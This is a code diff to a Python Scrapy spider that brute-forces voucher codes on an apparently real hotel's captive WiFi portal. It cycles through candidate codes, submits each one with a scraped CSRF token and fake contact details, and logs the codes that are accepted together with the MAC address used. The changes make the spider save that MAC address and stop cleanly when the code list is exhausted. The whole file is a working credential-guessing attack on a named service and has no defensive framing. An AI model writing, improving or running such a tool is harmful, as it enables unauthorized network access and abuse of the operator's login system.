@@ -2,6 +2,7 @@ import logging
 import random
 
 import scrapy
+from scrapy.exceptions import CloseSpider
 from scrapy.spidermiddlewares.httperror import HttpError
 from scrapy.utils.request import request_httprepr
 from scrapy.utils.response import response_httprepr
@@ -75,7 +76,7 @@ class Spider(scrapy.Spider):
         url = f"https://loceanicahotel.artinwifi.com/?ssid=loceanicahotel.artinwifi&id={mac_address}&" \
               f"ip=172.16.8.242&username=&url=http://detectportal.firefox.com/canonical.html" \
               f"&ap=loceanicahotel.artinwifi&link-login-only=http://loceanicahotel.artinwifi/login"
-        meta = {"cookiejar": cookiejar}
+        meta = {"cookiejar": cookiejar, "mac_address": mac_address}
         return scrapy.Request(url=url, callback=self.parse, errback=self.errback, meta=meta, headers=meta)
 
     def parse(self, response, **kwargs):
@@ -83,14 +84,18 @@ class Spider(scrapy.Spider):
         # in case of parsing first login page, there is no password, and no "Password Not Valid" message
         if password:
             if "Password Not Valid!" not in response.text:
-                yield dict(password=password)
+                mac_address = response.meta.get("mac_address")
+                yield dict(mac_address=mac_address, password=password)
             self.state["start"] = password
 
         csrf_token = response.css("input[name=csrf_token]::attr(value)").get()
         yield self._login_request(csrf_token=csrf_token, cookiejar=response.meta["cookiejar"])
 
     def _login_request(self, cookiejar, csrf_token):
-        password = next(self.passwords)
+        password = next(self.passwords, None)
+        if password is None:
+            raise CloseSpider("Done")
+
         body = f"csrf_token={csrf_token}&redirect_override=&element_2962_namesurname_value=xxx+xxx&" \
                f"element_2963_email_value=xxx%40google.com&element_2964_voucher_value={password}&" \
                f"element_2965_checkbox_value=1&next="
